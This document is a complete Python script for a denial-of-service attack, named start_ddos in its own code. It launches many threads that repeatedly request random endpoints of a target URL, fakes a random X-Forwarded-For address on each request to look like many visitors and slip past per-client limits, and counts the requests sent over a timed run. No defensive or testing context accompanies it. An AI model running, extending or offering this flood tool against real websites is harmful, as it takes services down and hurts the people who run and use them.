import requests
import threading
import random
import time

# Default number of threads to use for the attack
threads_count = 100

# Event to signal threads to stop
stop_event = threading.Event()

# Counter for tracking the number of requests
requests_count = 0
requests_lock = threading.Lock()  # Lock to protect access to the counter

# Function to send random GET requests
def send_request(endpoint, callback=print):
    global requests_count
    while not stop_event.is_set():  # Check if the stop event is set
        try:
            # Generate a random IP to simulate different visitors
            ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "X-Forwarded-For": ip
            }
            # Send the GET request to the endpoint
            response = requests.get(endpoint, headers=headers)
            with requests_lock:
                requests_count += 1  # Increment the counter safely
            callback(f"Request sent to {endpoint} with IP {ip}, status: {response.status_code}")
        except Exception as e:
            callback(f"Error sending request to {endpoint}: {e}")
        time.sleep(random.uniform(0.1, 1))  # Random pause between requests

# Function to periodically report the number of requests sent
def report_requests(callback=print):
    global requests_count
    while not stop_event.is_set():
        time.sleep(5)  # Wait for 5 seconds
        with requests_lock:
            callback(f"Total requests sent so far: {requests_count}")

# Function to start the threads with a timeout duration
def start_ddos(url, endpoints, threads_count=threads_count, duration=60, callback=print):
    global requests_count
    threads = []
    stop_event.clear()  # Ensure the stop event is cleared at the start
    requests_count = 0  # Reset the counter at the start
    start_time = time.time()

    callback("Starting sending packets to all endpoints ...")
    # Start the request threads
    for i in range(threads_count):
        endpoint = random.choice(endpoints)  # Choose a random endpoint
        thread = threading.Thread(target=send_request, args=(url + endpoint,))
        threads.append(thread)
        thread.start()

    # Start the reporting thread
    reporter_thread = threading.Thread(target=report_requests, args=(callback,))
    threads.append(reporter_thread)
    reporter_thread.start()

    # Run for the specified duration
    while time.time() - start_time < duration and not stop_event.is_set():
        time.sleep(0.1)

    # Stop the attack after the duration has passed
    callback("Stopping all threads.")
    stop_event.set()  # Signal all threads to stop
    for thread in threads:
        thread.join()  # Ensure threads complete their execution
    callback(f"DDOS finished. Total requests sent: {requests_count}")
